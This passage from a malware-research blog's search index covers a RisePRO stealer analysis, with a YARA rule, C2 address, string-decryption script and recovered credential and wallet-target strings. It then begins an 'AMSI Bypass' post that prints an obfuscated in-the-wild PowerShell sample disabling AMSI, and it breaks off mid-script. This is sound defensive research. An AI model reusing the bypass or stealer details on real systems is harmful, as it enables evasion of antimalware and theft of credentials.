d6 f5 ff ff 8d 45 ?? 50 ff 75 ?? e8 b7 f9 ff ff 59 59 8d 4d ?? 8b f0 8b fa e8 04 f6 ff ff 8b d7 8b c6 5f 5e c9 c3} $trait_2 = { 8b c7 83 ff 40 99 89 46 ?? 6a 3f 58 0f 4d f8 89 56 ?? 8b 55 ?? 33 c0 33 c9 0f ab f8 83 ff 20 0f 43 c8 33 c1 83 ff 40 0f 43 c8 09 44 1a ?? 09 4c 1a ?? 66 83 4e ?? ?? 5f 8b c6 5e 5b c9 c3} $trait_4 = { 8b 45 ?? 0f b7 c0 8d 04 48 0f b6 4c 1f ?? 89 45 ?? 8b 45 ?? 0f b7 c0 83 c0 fc 66 c1 e1 08 89 45 ?? 0f b6 44 1f ?? 66 0b c8 0f b6 44 1f ?? 66 03 45 ?? 0f b7 c9 0f b7 d0 66 85 c9 74 69} $trait_5 = { 8b 43 ?? 56 0f b7 73 ?? 2b d6 0f b7 48 ?? 8b c2 33 d2 83 e9 04 f7 f1 0f b7 43 ?? 03 d6 3b d0 6a 04 0f 47 d6 59 03 d1 5e 2b 7d ?? 03 d7 3b d1 5f 0f 42 d1 66 8b c2 5b c9 c3} $trait_6 = { 8a 4d ?? 8a 45 ?? 8a 55 ?? 8b 7d ?? c0 e9 04 80 e1 03 c0 e0 02 02 c8 8a 45 ?? 88 4d ?? 8a ca c0 e9 02 80 e1 0f c0 e0 04 c0 e2 06 02 c8 02 55 ?? 4b 88 4d ?? 88 55 ?? 85 db 7e 24} $trait_7 = { 89 75 ?? ff 75 ?? e8 9b 0d 00 00 59 89 75 ?? ff 75 ?? ff 75 ?? e8 c1 00 00 00 59 59 8b f0 89 75 ?? c7 45 ?? ?? ?? ?? ?? e8 15 00 00 00 8b c6 8b 4d ?? 64 89 0d 00 00 00 00 59 5f 5e 5b c9 c3} $trait_8 = { b6 45 f8 88 4d ?? c1 e9 08 03 c8 0f b6 45 ?? 88 4d ?? c1 e9 08 03 c8 0f b6 45 ?? 88 4d ?? c1 e9 08 03 c8 88 4d ?? c1 e9 08 00 4d ?? 83 c6 c0 8b c6 83 d7 ff 83 c3 40 85 ff 77 88} $trait_9 = { 56 b2 2e 8b f1 e8 13 00 00 00 85 c0 74 03 40 eb 02 8b c6 b2 2f 8b c8 5e e9 00 00 00 00 53 8a da eb 0d 3a c3 74 13 51 ff 15 ?? ?? ?? ?? 8b c8 8a 01 84 c0 75 ed 33 c0 5b c3} $trait_10 = { 56 8b f1 8b 4e ?? e8 3a 01 00 00 8b 4e ?? 8a d0 85 c9 74 06 5e e9 24 00 00 00 b8 00 10 00 00 66 85 46 ?? 74 0c 8b 46 ?? 8b 00 8b 48 ?? 8b 09 eb e3 6a 62 59 84 d2 0f b6 c2 5e 0f 44 c1 c3} $trait_11 = { 56 8b f1 85 d2 74 34 53 8a 5a ?? f6 c3 04 75 2a 83 7e ?? ?? 74 08 8b 02 f6 40 ?? ?? 74 1c 8b 4a ?? 80 cb 04 88 5a ?? 85 c9 78 0f 8b 42 ?? 6b d1 28 03 50 ?? 80 6a ?? ?? 74 ce 5b 5e c3} $trait_12 = { 56 8b f1 0f b7 46 ?? a9 60 24 00 00 74 2e a9 00 20 00 00 74 0f 8b 16 e8 3a 00 00 00 8b ce 5e e9 b0 ff ff ff a9 00 04 00 00 74 13 8b 4e ?? 85 c9 74 0c ff 76 ?? ff d1 83 66 ?? ?? 59 5e c3} $trait_13 = { 56 8b 71 ?? 57 6a 05 58 c7 06 40 42 0f 00 8b 51 ?? eb 04 89 04 96 4a 3b d0 7d f8 33 ff 47 eb 09 6a 0b 58 2b c2 89 04 96 4a 3b d7 7d f3 80 79 ?? ?? 74 06 8b 41 ?? 89 3c 86 5f 5e c3} $trait_14 = { 55 8b ec 8b 41 ?? 56 85 c0 74 14 ff 75 ?? ff 75 ?? ff 75 ?? 52 ff 71 ?? ff d0 83 c4 14 eb 1d 8b 45 ?? 33 f6 3b 75 ?? 75 10 ff 75 ?? 50 52 ff 71 ?? ff 51 ?? 83 c4 10 eb 03 83 c8 ff 5e 5d c3} $trait_15 = { 55 8b ec 83 ec 58 53 56 57 8b 7d ?? 33 db 89 4d ?? 33 f6 0f 57 c0 89 55 ?? 8b 0f 89 4d ?? 8a 41 ?? 88 45 ?? 8b 01 89 45 ?? 33 c0 21 45 ?? 66 89 45 ?? 8a 02 66 0f 13 45 ?? 3c 80 73 07} $trait_16 = { 55 8b ec 83 ec 24 56 8d 75 ?? eb 1e 85 d2 74 1e 8b 41 ?? 3b 42 ?? 73 0a 89 4e ?? 8b f1 8b 49 ?? eb 08 89 56 ?? 8b f2 8b 52 ?? 85 c9 75 de 85 c9 0f 44 ca 89 4e ?? 8b 45 ?? 5e c9 c3} $trait_17 = { 8d 45 ?? 50 8d 45 ?? 50 8d 45 ?? 50 e8 b7 0a ff ff 8d 45 ?? 50 8d 45 ?? 50 e8 8a 14 ff ff 83 c4 14 be 09 00 00 00 ?? ?? 8d 45 ?? 50 50 e8 76 14 ff ff 83 c4 08 83 ee 01 75 ee} $trait_18 = { 55 8b ec 83 e4 f8 51 56 8b f1 83 7e ?? ?? 75 23 80 7e ?? ?? 72 1d a1 ?? ?? ?? ?? 85 c0 74 02 ff d0 8b ce e8 f8 df ff ff a1 ?? ?? ?? ?? 85 c0 74 02 ff d0 8b ce e8 18 00 00 00 5e 8b e5 5d c3} $trait_19 = { 55 8b ec 53 8b 5d ?? 56 57 8b 7d ?? 8d 47 ?? 50 57 53 e8 b9 fd fe ff 8d 77 ?? 56 8d 47 ?? 50 8d 43 ?? 50 e8 a8 fd fe ff 8d 47 ?? 50 8d 43 ?? 56 50 e8 9a fd fe ff 83 c4 24 5f 5e 5b 5d c3} $trait_20 = { 55 8b ec 51 56 8b 71 ?? 57 8b fa eb 22 3b 75 ?? 74 1a 85 ff 74 05 39 7e ?? 75 11 80 7e ?? ?? 75 0b 8b ce e8 12 00 00 00 85 c0 75 09 8b 76 ?? 85 f6 75 da 33 c0 5f 5e 59 5d c3} $trait_21 = { 55 8b ec 51 56 57 8b fa 8b f1 eb 28 8b 4e ?? e8 92 01 00 00 85 c0 75 19 3b 7e ?? 73 14 ff 75 ?? 8b d7 8b ce e8 14 00 00 00 59 85 c0 74 03 89 46 ?? 8b 76 ?? 85 f6 75 d4 5f 5e 59 5d c3} $trait_22 = { 55 8b ec 51 56 57 6a 01 8d 45 ?? 8b f1 50 8b fa 57 ff 76 ?? ff 56 ?? 83 c4 10 83 f8 01 75 0d 8b 45 ?? 0f b6 4d ?? 89 08 33 c0 eb 0d 57 ff 76 ?? ff 56 ?? f7 d8 59 59 1b c0 5f 5e c9 c3} $trait_23 = { 55 8b ec 51 51 53 56 8b 75 ?? 57 8b 46 ?? 8b 4e ?? 83 c0 fb 3b c1 0f 46 c8 8b 06 89 4d ?? 33 ff 8b 40 ?? 89 45 ?? 8b 86 ?? ?? ?? ?? 8b 16 83 c0 2a c1 f8 03 8b 5a ?? 3b d8 0f 82 04 01 00 00} $trait_24 = { 53 8b dc 83 ec 08 83 e4 f0 83 c4 04 55 8b 6b ?? 89 6c 24 ?? 8b ec 83 ec 28 a1 ?? ?? ?? ?? 33 c5 89 45 ?? 8b 4b ?? 8b 53 ?? 56 33 f6 89 55 ?? 57 8b 7b ?? 81 f9 e0 00 00 00 0f 82 15 01 00 00} $trait_25 = { 8d 45 ?? 50 8d 45 ?? 50 8d 45 ?? 50 e8 1d 0a ff ff 8d 45 ?? 50 8d 45 ?? 50 e8 f0 13 ff ff 83 c4 14 be 31 00 00 00 8d 45 ?? 50 50 e8 de 13 ff ff 83 c4 08 83 ee 01 75 ee} $trait_26 = { 13 c0 03 d1 8b 4d ?? 83 d0 00 23 5d ?? 0b 5d ?? c1 e3 08 c1 e9 12 0b d9 8b 4d ?? 03 d8 8b 45 ?? 51 03 59 ?? 89 38 89 70 ?? 89 50 ?? 89 58 ?? e8 82 f8 ff ff 83 c4 08 5f 5e 5b 8b e5 5d c3} $trait_27 = { 0f b6 47 ?? 0f b6 0f 83 c7 02 c1 e0 08 03 c8 8b c2 83 e2 3f 25 c0 03 00 00 83 c2 40 81 e1 ff 03 00 00 03 d0 c1 e2 0a 03 d1 8b 4d ?? 8d 46 ?? 89 45 ?? 81 fa 80 00 00 00 73 06} $trait_28 = { 0f b6 0f 0f b6 47 ?? 83 c7 02 c1 e1 08 03 c8 8b c2 83 e2 3f 25 c0 03 00 00 83 c2 40 81 e1 ff 03 00 00 03 d0 c1 e2 0a 03 d1 8b 4d ?? 8d 46 ?? 89 45 ?? 81 fa 80 00 00 00 73 06} condition: uint16(0) == 0x5a4d and uint32(uint32(0x3c)) == 0x00004550 and 7 of them } . C2 . The C2 domain is stored in plain text in RisePRO unlike PrivateLoader (where it is encrypted). . 194.169.175[.]128 . String Decryption . There are encrypted stack strings that are composed of the string data, and an accompanying XOR key. These are loaded onto the stack, then directly XOR decrypted. . X-Junior IDA Script . X-Junior has a script that we can try in IDA to decrypt these strings: GitHub Repo. . Andre Tavares Python Script . andretavare5 has a python script using capstone to decrypt the strings: Script Gist. . We have created our own hybrid of the two, which uses capstone for disassembly, but implements the logic from the IDA script... . XorStr Library . The string decryption looks a lot like this open source library xorstr. The following is an example of the library in use. . .text:00411E14 C7 44 24 08 25 7B 87 92 mov [esp+60h+var_58], 92877B25h .text:00411E1C 0F 57 C0 xorps xmm0, xmm0 .text:00411E1F C7 44 24 0C B6 10 A7 1F mov [esp+60h+var_54], 1FA710B6h .text:00411E27 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E2B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E2F 89 44 24 10 mov dword ptr [esp+60h+var_50], eax .text:00411E33 89 4C 24 14 mov dword ptr [esp+60h+var_50+4], ecx .text:00411E37 C7 44 24 08 D1 77 20 5B mov [esp+60h+var_58], 5B2077D1h .text:00411E3F C7 44 24 0C C5 36 32 7E mov [esp+60h+var_54], 7E3236C5h .text:00411E47 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E4B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E4F 89 44 24 18 mov dword ptr [esp+60h+var_50+8], eax .text:00411E53 89 4C 24 1C mov dword ptr [esp+60h+var_50+0Ch], ecx .text:00411E57 C7 44 24 08 6D 1E EB FE mov [esp+60h+var_58], 0FEEB1E6Dh .text:00411E5F C7 44 24 0C D9 3C 87 48 mov [esp+60h+var_54], 48873CD9h .text:00411E67 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E6B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E6F C7 44 24 08 BE 05 4C 3F mov [esp+60h+var_58], 3F4C05BEh .text:00411E77 89 44 24 40 mov dword ptr [esp+60h+var_20], eax .text:00411E7B C7 44 24 0C E4 36 32 7E mov [esp+60h+var_54], 7E3236E4h .text:00411E83 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E87 89 4C 24 44 mov dword ptr [esp+60h+var_20+4], ecx .text:00411E8B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E8F 89 44 24 48 mov dword ptr [esp+60h+var_20+8], eax .text:00411E93 8D 44 24 10 lea eax, [esp+60h+var_50] .text:00411E97 89 4C 24 4C mov dword ptr [esp+60h+var_20+0Ch], ecx .text:00411E9B 8D 50 01 lea edx, [eax+1] .text:00411E9E 0F 28 4C 24 40 movaps xmm1, [esp+60h+var_20] .text:00411EA3 66 0F EF 4C 24 10 pxor xmm1, [esp+60h+var_50] .text:00411EA9 0F 29 4C 24 10 movaps [esp+60h+var_50], xmm1 .text:00411EAE 0F 29 44 24 20 movaps [esp+60h+var_40], xmm0 .text:00411EB3 C7 44 24 30 00 00 00 00 mov [esp+60h+var_30], 0 .text:00411EBB C7 44 24 34 00 00 00 00 mov [esp+60h+var_2C], 0 . String Extraction . The string encryption is almost identical to privateloader, we had to adjust for registers that store immediates for multiple strings in a row. Also, there are situations where the stack string DWORDs are not combined in order. Currently we don&#39;t handle this, but the solution is to use the .dis memory displacement to determine the order of the the DWORDs. . Decryption Algorithm . select the first section in the PE file, assume this is the code | scan code for final pxor instruction and truncate at this instruction to remove extra code from scanning (handle packers with large first sections) | linear disassemble the full code block - not efficient | traverse assembly until pxor instruction is located | scan backwards until all immediate data is located for the xmm registers | decrypt xmm data, this is the string chunk | keep running tally of string chunks and combine if no instructions separate them | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct from capstone import * from capstone.x86 import * import re import time def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def xor(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) def get_reg_data(instructions, reg_name): search_count = 0 search_limit = 2000 for inst in instructions: if search_count &gt; search_limit: break search_count += 1 if inst.mnemonic == &#39;mov&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[1].type == X86_OP_IMM: if inst.reg_name(inst.operands[0].reg) == reg_name: imm_value = inst.operands[1].value.imm data_chunk = struct.pack(&#39;&lt;I&#39;,imm_value) return data_chunk return None def get_data(instructions): data_chunks = [] count = 0 steps = 0 steps_flag = 0 flag_reg = 0 search_count = 0 search_limit = 400 for inst_ptr in range(0,len(instructions)): inst = instructions[inst_ptr] steps +=1 if search_count &gt; search_limit: break search_count += 1 if inst.mnemonic == &#39;call&#39;: break # if inst.mnemonic == &#39;mov&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[1].type == X86_OP_IMM: # flag_reg = 1 if inst.mnemonic == &#39;mov&#39; and inst.operands[0].type == X86_OP_MEM and inst.operands[1].type == X86_OP_REG: reg_name = inst.reg_name(inst.operands[1].reg) #print(f&quot;Scanning for {reg_name} data....&quot;) result = get_reg_data(instructions[inst_ptr:], reg_name) if result is None: #print(&quot;scanning failed&quot;) break #print(f&quot;Found reg {reg_name} data {result}&quot;) data_chunks.append(result) count += 1 steps = 0 steps_flag = 1 if inst.mnemonic == &#39;mov&#39; and ( (inst.operands[0].type == X86_OP_MEM and inst.operands[0].value.mem.disp != 0) or inst.operands[0].type == X86_OP_REG ) and inst.operands[1].type == X86_OP_IMM: imm_value = inst.operands[1].value.imm #print(hex(imm_value)) if imm_value &amp; 0xff000000 == 0: break data_chunk = struct.pack(&#39;&lt;I&#39;,imm_value) data_chunks.append(data_chunk) count += 1 steps = 0 steps_flag = 1 if steps == 16 and steps_flag: break #if steps == 6 and steps_flag: # if you got some garbage string use this instead of the above #break enc_data = data_chunks[0:count//2][::-1] key = data_chunks[count//2:count][::-1] if flag_reg : enc_data = sum(zip(enc_data[1::2], enc_data[::2]), ()) key = sum(zip(key[1::2], key[::2]), ()) return b&#39;&#39;.join(enc_data),b&#39;&#39;.join(key) def get_strings_from_inst(instructions): # search, build and decrypt strings strings = [] addr = None string = &#39;&#39; for i, inst in enumerate(instructions): if inst.mnemonic == &#39;pxor&#39;: # if inst.address == 0x0045C8A0: #print(hex(inst.address)) #try: # possible string decryption found reversed_instruction_list = instructions[:i][::-1] encrypted_str, key = get_data(reversed_instruction_list) # print(f&quot;str_len: {len(encrypted_str)}, key_len: {len(key)}&quot;) # print(encrypted_str.hex()) # print(key.hex()) if len(encrypted_str) == 0 or len(key) == 0: #print(f&quot;Error at {hex(inst.address)} key or data is missing&quot;) continue if len(encrypted_str) != len(key): #print(f&quot;Error at {hex(inst.address)} key and data not equal length&quot;) continue out = bytearray(encrypted_str[j] ^ key[j] for j in range(len(key))) #print(out) out = out.replace(b&#39; x00&#39;,b&#39;&#39;) if len(out) == 0: continue #print(out.decode(&#39;utf-8&#39;)) if is_ascii(out): strings.append((inst.address,out.decode(&#39;utf-8&#39;))) return strings SAMPLE_PATH = &#39;/tmp/xorstr/work/rise.bin&#39; filename = SAMPLE_PATH pe = pefile.PE(filename) # Assume the first section is code txt = pe.sections[0] # TODO: we don&#39;t seem to be disassembling the full section?!! image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt.VirtualAddress section_offset = txt.PointerToRawData section_data = txt.get_data() pxor_egg = rb&#39; x66 x0F xEF&#39; scan_end = section_data.rfind(pxor_egg) section_data = section_data[:scan_end] # disassemble .txt section pe = pefile.PE(filename) md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True md.skipdata = True addr = 0 ## Time starts t = time.time() # instructions = [] # for inst in md.disasm(section_data, image_base + section_rva): # instructions.append(inst) # strings = get_strings_from_inst(instructions) strings = [] for m in re.finditer(pxor_egg, section_data, re.DOTALL): scan_end = m.start() instructions = [] for inst in md.disasm(section_data[scan_end-0x400:scan_end], image_base + section_rva + scan_end - 0x400): instructions.append(inst) strings += get_strings_from_inst(instructions) # Benchmark 50.47584390640259 metastealer print(f&quot;Benchmark {time.time() - t}&quot;) # print(len(strings)) string_dict = {} last_string = &#39;&#39; for s in strings: if last_string != s[1]: string_dict[s[0]] = s[1] last_string = s[1] for o in string_dict.keys(): print(f&quot;{hex(o)} {string_dict[o]}&quot;) print(&quot;done&quot;) . Benchmark 11.684903144836426 0x45977b Vault_IE 0x459fe0 FileZilla 0x45a526 IndexedDB 0x45afb0 History 0x45b1f1 .txt 0x45b25f 0x45bf57 name_on_card 0x45c051 card_number 0x45c555 exp_month 0x45d007 .txt 0x45d060 0x45d78b &#34;rLd 0x45dfe8 .txt 0x45e056 0x45e560 expirationDate 0x45e924 httpOnly 0x45ee5c .txt 0x45eeca 0x45f3d4 expirationDate 0x45f9d8 %s %s %s %s %llu %s %s 0x45fb81 wb 0x460383 Storage: %s [%s] URL: %s Login: %s Password: %s 0x460ec5 Storage: %s UserName: %s E-MAIL: %s Token: %s 0x4622e5 bhghoamapcdpbohphigoooaddinpkbai 0x4624d3 nkbihfbeogaeaoehlefnkodbefgpgknn 0x462909 kncchdigobghenbbaddojjnnaogfppfj 0x462b0c fihkakfobkmkjojpchpfgcmhfjnmnfpi 0x462d0f nkddgncdjgjfcddamfgcmfnlhccnimig 0x462edb nanjmdknhkinifnkgdcggcfnhdaammmj 0x463109 nlbmnnijcnlegkjjpcfjclmcfggfefdm 0x463318 amkmjjmmflddogmhpjloimipbofnfjih 0x46351b nhnkbkgjikgcigadomkphalanndcapjk 0x463721 cphhlgmgameodnhkjdmkpanlelnlohao 0x463924 fnjhmkhhmkbjkkabndcnnogagogbneec 0x463b27 kpfopkelmapcoipemfendmdcghnegimn 0x463d2a blnieiiffboillknjnepogjhkgnoapac 0x463f2d hpglfhgfnhbgpjdenjgmdgoeiappafln 0x4640f9 hnfanknocfeofbddgcijnmhnfnkdnaad 0x464327 jbdaocneiiinmjbjlgalhcelgbejmnid 0x464739 ffnbelfdoeiohenkjibnmadjiehjhajb 0x464984 fhbohimaelbohpjbbldcngcnapndodjp 0x464b87 ibnejdfjmmkpcnlpebklmnkoeoihofec 0x464d8a bfnaelmomeimhlpmgjnjophhpkkoljpa 0x464f69 fhilaheimglignddkjgofkcbgekhenbh 0x465eb0 aeachknmefphepccionboohckonoeemg 0x468aa6 vos wallt- 0x46a011 gojhcdgcpbpfigcaejpfhfegekdgiblk 0x46b485 e 0x46c565 &#34;rLd 0x46c5aa ogies BlackHaw 0x46d267 ion NVIDIA GeFor 0x46d60c omePlus User Dat 0x46df9a ChromiumViewer 0x46df20 dules ChromiumVi 0x46e5af Torch 0x46ee1a Atom 0x46f412 %DESKTOP% 0x46f548 %DOCUMENTS% 0x47133e &#34;rLd 0x4732ba 0x47504d profiles.ini 0x4754a3 places.sqlite 0x476068 profiles.ini 0x476509 cookies.sqlite 0x4770ea profiles.ini 0x47759d places.sqlite 0x477a63 moz_places WHERE 0x4780f1 profiles.ini 0x478ff2 signons.sqlite 0x47a281 0x47a588 encrypted_key 0x47b86c email 0x47b8c3 username 0x47cef7 0x47decd encrypted_key 0x47f682 0x47f9df encrypted_key 0x47fbfb ~rLd 0x47febe encrypted_key 0x481b13 0x483135 encrypted_key 0x486542 ip 0x486c2c country 0x487430 demoInfo 0x487507 countryCode 0x487574 demoInfo 0x4875dd countryCode 0x487d6c country 0x487ead iso_code 0x48874a 1.1.1.1 0x4887b4 ZZ 0x488e95 mozglue.dll 0x488f6a softokn3.dll 0x489b97 Monero wallets 0x489ddf Jaxx Liberty 0x48a000 Local Storage 0x48abce bither.db 0x48ad6b ElectronCash 0x48b137 Ethereum 0x48b310 IndexedDB 0x48bd53 Florincoin 0x48be71 GoldCoin (GLD) 0x48c2fb digitalcoin 0x48c4cb Ledger Live 0x48cbb7 Authy Desktop 0x48ce9a Local Storage 0x48d948 SOFTWARE Microsoft Cryptography 0x48da64 MachineID: %s 0x48db55 GUID: %s 0x48de4a Path: %s 0x48dea4 Work Dir: %s 0x48e8b2 Local Time: %d/%d/%d %d:%d:%d 0x48ea2e [Hardware] 0x48eb22 HARDWARE DESCRIPTION System CentralProcessor 0 0x48ec7a Processor: %s 0x48ed73 RAM: %u MB 0x48efd1 [Processes] 0x48f074 %s [%d] 0x48f462 DisplayVersion 0x4920ed InternetOpenA done .",
            "url": "https://research.openanalysis.net/risepro/stealer/config/triage/2023/06/15/risepro.html",
            "relUrl": "/risepro/stealer/config/triage/2023/06/15/risepro.html",
            "date": " ‚Ä¢ Jun 15, 2023"
        }
        
    
  
    
        ,"post4": {
            "title": "AMSI Bypass In The Wild",
            "content": "Overview . We found this unique sample using an AMSI bypass to load AsyncRAT. . Samples . 43cc6ed0dcd1fa220283f7bbfa79aaf6342fdb5e73cdabdde67debb7e2ffc945 unpacme | . References . Antimalware Scan Interface (AMSI) | Exploring PowerShell AMSI and Logging Evasion | AMSI &amp; Bypass: Review of Known AMSI Bypass Techniques and Introducing a New One | Documenting the Undocumented: The Rise and Fall of AMSI | amsi.fail a website for breaking AMSI pattern matching | online disassembler | another online disassembler | AmsiBypass code | callback shellcode execution | AlternativeShellcodeExec | . Analysis . Powershell Decryption . import re def deobfuscate(script): # Regex to find all obfuscated characters regex = r&#39; [char ] (([^)]+) )&#39; # Function to deobfuscate a single character def deobfuscate_char(match): # Evaluate the expression inside the [char]() function ascii_value = eval(match.group(1)) # Convert the ASCII value to a character return chr(ascii_value) # Replace all obfuscated characters in the script deobfuscated_script = re.sub(regex, deobfuscate_char, script) return deobfuscated_script ss = &#39;&#39;&#39; set-alias wupeqlck $([char](170-55)+[char](151-50)+[char](236-120)+[char](94-49)+[char](151-54)+[char](157-49)+[char](211-106)+[char](215-118)+[char](236-121)) $uxh90d48 = $executioncontext $be718nho=$([char](207-102)+[char](231-121)+[char](175-57)+[char](163-52)+[char](229-122)+[char](207-106)+[char](152-53)+[char](166-55)+[char](216-107)+[char](164-55)+[char](149-52)+[char](166-56)+[char](216-116)) $3561ig2l=$([char](217-116)+[char](169-49)+[char](167-55)+[char](208-111)+[char](227-117)+[char](151-51)+[char](222-107)+[char](164-48)+[char](214-100)+[char](214-109)+[char](158-48)+[char](212-109)) [Ref].Assembly.GetType($uxh90d48.$be718nho.$3561ig2l($([char](189-106)+[char](171-50)+[char](215-100)+[char](216-100)+[char](204-103)+[char](230-121)+[char](152-106)+[char](199-122)+[char](201-104)+[char](221-111)+[char](216-119)+[char](218-115)+[char](217-116)+[char](231-122)+[char](152-51)+[char](166-56)+[char](237-121)+[char](150-104)+[char](181-116)+[char](229-112)+[char](168-52)+[char](160-49)+[char](219-110)+[char](204-107)+[char](225-109)+[char](213-108)+[char](167-56)+[char](213-103)+[char](94-48)+[char](118-53)+[char](162-53)+[char](164-49)+[char](214-109)+[char](191-106)+[char](217-101)+[char](225-120)+[char](209-101)+[char](164-49)))).GetField($uxh90d48.$be718nho.$3561ig2l($([char](213-116)+[char](220-111)+[char](172-57)+[char](153-48)+[char](130-57)+[char](220-110)+[char](208-103)+[char](172-56)+[char](124-54)+[char](153-56)+[char](216-111)+[char](212-104)+[char](208-107)+[char](156-56))),$uxh90d48.$be718nho.$3561ig2l($([char](197-119)+[char](209-98)+[char](225-115)+[char](131-51)+[char](230-113)+[char](146-48)+[char](230-122)+[char](154-49)+[char](211-112)+[char](150-106)+[char](185-102)+[char](234-118)+[char](147-50)+[char](225-109)+[char](160-55)+[char](201-102)))).SetValue($sj68ma4xd9in,$true); [PSObject].Assembly.GetType($([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]84+[char]121+[char]112+[char]101+[char]65+[char]99+[char]99+[char]101+[char]108+[char]101+[char]114+[char]97+[char]116+[char]111+[char]114+[char]115) )::Add($([char]73+[char]112+[char]114+[char]81+[char]117+[char]102+[char]107+[char]111+[char]85+[char]104+[char]118+[char]119+[char]101+[char]105+[char]83) , $([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]82+[char]117+[char]110+[char]116+[char]105+[char]109+[char]101+[char]46+[char]73+[char]110+[char]116+[char]101+[char]114+[char]111+[char]112+[char]83+[char]101+[char]114+[char]118+[char]105+[char]99+[char]101+[char]115+[char]46+[char]77+[char]97+[char]114+[char]115+[char]104+[char]97+[char]108) ) $vmwehn2zjl9r=$uxh90d48.$be718nho.$3561ig2l($([char](216-111)+[char](230-120)+[char](221-103)+[char](218-107)+[char](159-52)+[char](149-48)+[char](102-57)+[char](222-121)+[char](234-114)+[char](210-98)+[char](211-97)+[char](209-108)+[char](223-108)+[char](223-108)+[char](218-113)+[char](214-103)+[char](215-105))) $ji1bl04dnkgt = $([char](66-53)+[char](113-103)+[char](111-98)+[char](128-118)+[char](166-49)+[char](172-57)+[char](205-100)+[char](213-103)+[char](208-105)+[char](84-52)+[char](186-103)+[char](234-113)+[char](214-99)+[char](173-57)+[char](206-105)+[char](210-101)+[char](180-121)+[char](69-56)+[char](113-103)+[char](165-48)+[char](171-56)+[char](155-50)+[char](230-120)+[char](208-105)+[char](136-104)+[char](137-54)+[char](175-54)+[char](170-55)+[char](237-121)+[char](157-56)+[char](159-50)+[char](154-108)+[char](132-50)+[char](216-99)+[char](219-109)+[char](231-115)+[char](161-56)+[char](220-111)+[char](156-55)+[char](163-117)+[char](184-111)+[char](163-53)+[char](233-117)+[char](208-107)+[char](170-56)+[char](208-97)+[char](220-108)+[char](195-112)+[char](207-106)+[char](229-115)+[char](170-52)+[char](210-105)+[char](211-112)+[char](201-100)+[char](212-97)+[char](172-113)+[char](61-48)+[char](114-104)+[char](121-108)+[char](116-106)+[char](167-55)+[char](171-54)+[char](152-54)+[char](161-53)+[char](159-54)+[char](214-115)+[char](131-99)+[char](150-51)+[char](159-51)+[char](199-102)+[char](218-103)+[char](220-105)+[char](81-49)+[char](233-120)+[char](184-117)+[char](221-111)+[char](218-100)+[char](239-120)+[char](165-49)+[char](226-121)+[char](211-103)+[char](197-119)+[char](192-122)+[char](167-55)+[char](166-101)+[char](196-111)+[char](199-101)+[char](239-119)+[char](138-106)+[char](177-54)+[char](69-56)+[char](115-105)+[char](110-97)+[char](110-100)+[char](140-108)+[char](131-99)+[char](144-112)+[char](138-106)+[char](202-111)+[char](179-111)+[char](220-112)+[char](207-99)+[char](192-119)+[char](229-120)+[char](165-53)+[char](210-99)+[char](217-103)+[char](225-109)+[char](94-54)+[char](131-97)+[char](220-113)+[char](217-116)+[char](226-112)+[char](160-50)+[char](223-122)+[char](229-121)+[char](173-122)+[char](167-117)+[char](143-109)+[char](144-100)+[char](80-48)+[char](171-102)+[char](229-119)+[char](217-101)+[char](222-108)+[char](234-113)+[char](130-50)+[char](163-52)+[char](160-55)+[char](166-56)+[char](167-51)+[char](109-48)+[char](133-99)+[char](122-51)+[char](205-104)+[char](224-108)+[char](199-119)+[char](226-112)+[char](233-122)+[char](203-104)+[char](170-105)+[char](200-100)+[char](151-51)+[char](232-118)+[char](208-107)+[char](236-121)+[char](236-121)+[char](149-115)+[char](98-57)+[char](212-119)+[char](118-105)+[char](114-104)+[char](88-56)+[char](132-100)+[char](133-101)+[char](132-100)+[char](217-105)+[char](225-108)+[char](209-111)+[char](213-105)+[char](212-107)+[char](209-110)+[char](135-103)+[char](163-48)+[char](226-110)+[char](146-49)+[char](227-111)+[char](202-97)+[char](196-97)+[char](147-115)+[char](199-98)+[char](228-108)+[char](236-120)+[char](206-105)+[char](215-101)+[char](209-99)+[char](136-104)+[char](127-54)+[char](221-111)+[char](235-119)+[char](198-118)+[char](172-56)+[char](220-106)+[char](154-122)+[char](227-106)+[char](213-108)+[char](185-104)+[char](194-108)+[char](113-48)+[char](187-97)+[char](184-107)+[char](139-51)+[char](213-115)+[char](179-113)+[char](211-99)+[char](191-108)+[char](153-56)+[char](213-98)+[char](125-56)+[char](158-118)+[char](174-101)+[char](215-105)+[char](172-56)+[char](188-108)+[char](233-117)+[char](169-55)+[char](80-48)+[char](161-57)+[char](182-105)+[char](164-53)+[char](150-50)+[char](231-114)+[char](230-122)+[char](203-102)+[char](95-51)+[char](154-122)+[char](166-51)+[char](223-107)+[char](234-120)+[char](162-57)+[char](232-122)+[char](210-107)+[char](80-48)+[char](229-117)+[char](226-112)+[char](229-118)+[char](156-57)+[char](189-111)+[char](201-104)+[char](222-113)+[char](217-116)+[char](151-110)+[char](168-109)+[char](120-107)+[char](107-97)+[char](117-104)+[char](128-118)+[char](86-54)+[char](88-56)+[char](133-101)+[char](140-108)+[char](199-108)+[char](170-102)+[char](158-50)+[char](223-115)+[char](173-100)+[char](226-117)+[char](211-99)+[char](229-118)+[char](231-117)+[char](216-100)+[char](95-55)+[char](133-99)+[char](161-54)+[char](208-107)+[char](235-121